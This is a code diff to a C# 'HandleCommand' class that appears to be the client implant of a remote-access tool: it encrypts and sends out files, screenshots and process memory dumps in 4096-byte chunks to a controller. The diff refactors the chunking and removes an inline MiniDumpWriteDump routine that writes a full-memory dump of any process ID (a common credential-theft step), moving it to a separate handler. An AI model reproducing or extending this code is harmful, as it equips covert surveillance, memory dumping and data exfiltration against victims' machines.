@@ -15,6 +15,7 @@ namespace Client_side
 {
     internal class HandleCommand
     {
+        public static readonly int MaxChunkSize = 4096;
         public static object NativeMethods { get; private set; }
 
         public static void ProcessCommand(string command, Encryptor encryptor)
@@ -69,7 +70,6 @@ namespace Client_side
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
-
                         // Send the file chunks
                         int counter = 0;
                         foreach (string chunk in dumpChunks)
@@ -78,7 +78,6 @@ namespace Client_side
                             byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                             NetworkLayer.SendResult(encryptedChunk);
                             Thread.Sleep(10);
-                            Console.WriteLine(formattedChunk);
                             counter++;
                         }
                         break;
@@ -188,12 +187,10 @@ namespace Client_side
             {
                 fileContent = File.ReadAllBytes(path);
                 string fileContent64 = Encryptor.ConvertStr(fileContent);
-                // Split the file content into chunks of 4096 bytes
-                int chunkSize = 4096;
                 List<string> chunks = new();
-                for (int i = 0; i < fileContent64.Length; i += chunkSize)
+                for (int i = 0; i < fileContent64.Length; i += MaxChunkSize)
                 {
-                    chunks.Add(fileContent64.Substring(i, Math.Min(chunkSize, fileContent64.Length - i)));
+                    chunks.Add(fileContent64.Substring(i, Math.Min(MaxChunkSize, fileContent64.Length - i)));
                 }
 
                 return chunks;
@@ -205,56 +202,9 @@ namespace Client_side
         }
 
 
-        [DllImport("dbghelp.dll", 
-            EntryPoint = "MiniDumpWriteDump",
-            CallingConvention = CallingConvention.StdCall,
-            CharSet = CharSet.Unicode,
-            ExactSpelling = true,
-            SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-
-        public static extern bool MiniDumpWriteDump(
-            IntPtr hProcess,
-            uint processId,
-            SafeHandle hFile,
-            MINIDUMP_TYPE dumpType,
-            IntPtr expParam,
-            IntPtr userStreamParam,
-            IntPtr callbackParam
-        );
-
         public static List<string> GetProcDump(string pid)
         {
-            // Get Temp Path
-            string path = System.IO.Path.GetTempPath();
-            string fileName = Guid.NewGuid().ToString() + ".dmp";
-            string filePath = System.IO.Path.Combine(path, fileName);
-
-            try
-            {
-                Process process = Process.GetProcessById(int.Parse(pid));
-                using (var fs = new FileStream(filePath, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
-                {
-                    using (var safeFileHandle = new SafeFileHandle(fs.Handle, true))
-                    {
-                        if (!MiniDumpWriteDump(process.Handle, (uint)process.Id, safeFileHandle, MINIDUMP_TYPE.WithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
-                        {
-                            Console.WriteLine("Failed to create dump file");
-                        }
-                        else
-                        {
-                            Console.WriteLine("Dump file created successfully");
-                            return GetFile(filePath);
-                        }
-                    }
-                }
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-                return new List<string> { e.Message };
-            }
-            return new List<string>();
+            return MiniDumpHandler.Minidump(int.Parse(pid));
         }
 
 
@@ -336,39 +286,12 @@ namespace Client_side
                 screenShot.Save(ms, ImageFormat.Png);
                 byte[] imageBytes = ms.ToArray();
                 string imageBase64 = Encryptor.ConvertStr(imageBytes);
-                int chunkSize = 4096;
-                for (int i = 0; i < imageBase64.Length; i += chunkSize)
+                for (int i = 0; i < imageBase64.Length; i += MaxChunkSize)
                 {
-                    chunks.Add(imageBase64.Substring(i, Math.Min(chunkSize, imageBase64.Length - i)));
+                    chunks.Add(imageBase64.Substring(i, Math.Min(MaxChunkSize, imageBase64.Length - i)));
                 }
             }
             return chunks;
         }
-
-        public enum MINIDUMP_TYPE : int
-        {
-            // From dbghelp.h:
-            Normal = 0x00000000,
-            WithDataSegs = 0x00000001,
-            WithFullMemory = 0x00000002,
-            WithHandleData = 0x00000004,
-            FilterMemory = 0x00000008,
-            ScanMemory = 0x00000010,
-            WithUnloadedModules = 0x00000020,
-            WithIndirectlyReferencedMemory = 0x00000040,
-            FilterModulePaths = 0x00000080,
-            WithProcessThreadData = 0x00000100,
-            WithPrivateReadWriteMemory = 0x00000200,
-            WithoutOptionalData = 0x00000400,
-            WithFullMemoryInfo = 0x00000800,
-            WithThreadInfo = 0x00001000,
-            WithCodeSegs = 0x00002000,
-            WithoutAuxiliaryState = 0x00004000,
-            WithFullAuxiliaryState = 0x00008000,
-            WithPrivateWriteCopyMemory = 0x00010000,
-            IgnoreInaccessibleMemory = 0x00020000,
-            [SuppressMessage("Microsoft.Naming", "CA1726:UsePreferredTerms", Justification = "")]
-            ValidTypeFlags = 0x0003ffff,
-        };
     }
 }
